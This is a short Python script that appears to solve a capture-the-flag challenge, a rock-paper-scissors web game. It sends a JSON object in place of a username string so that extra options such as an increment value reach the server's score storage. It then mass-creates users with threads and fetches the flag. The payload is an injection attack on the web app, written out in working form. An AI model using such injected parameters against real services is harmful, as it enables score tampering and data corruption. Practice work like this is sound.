import concurrent.futures
import requests


DOMAIN = "https://rock-paper-scissors-b1b89c6ed8177e19.be.ax"
USERS = 5#000
WORKERS = 20
N = 20


def play(session: requests.Session):
    return session.post(DOMAIN + '/play', json={"position": '🪨'}).json()


def create_inactive_user(username: str):
    return requests.post(DOMAIN + "/new", json={"username": {
        "incr": 2000, "scoreMembers": username
    }})


def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as executor:
        jobs = [executor.submit(create_inactive_user, "qp" * (i + 1)) for i in range(USERS)]
        results = [fut.result() for fut in concurrent.futures.as_completed(jobs)]
        print(results[0].text)

    print("Finished creating users")

    session = requests.Session()
    new = session.post(DOMAIN + "/new", json={"username": "2+2"})
    print(new.text)

    for _ in range(10):
        print(play(session))
        scoreboard = session.get(DOMAIN + "/scores").json()
        print(scoreboard)

    print(session.get(DOMAIN + "/flag", json={"username": "qp"}).text)

    # with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as executor:
    #     jobs = [executor.submit(play, session) for _ in range(N)]
    #
    #     results = [fut.result() for fut in concurrent.futures.as_completed(jobs)]
    #     scores = [int(r.get("score", 0)) for r in results]
    #     print(sum(scores) / N, max(scores))


if __name__ == '__main__':
    main()
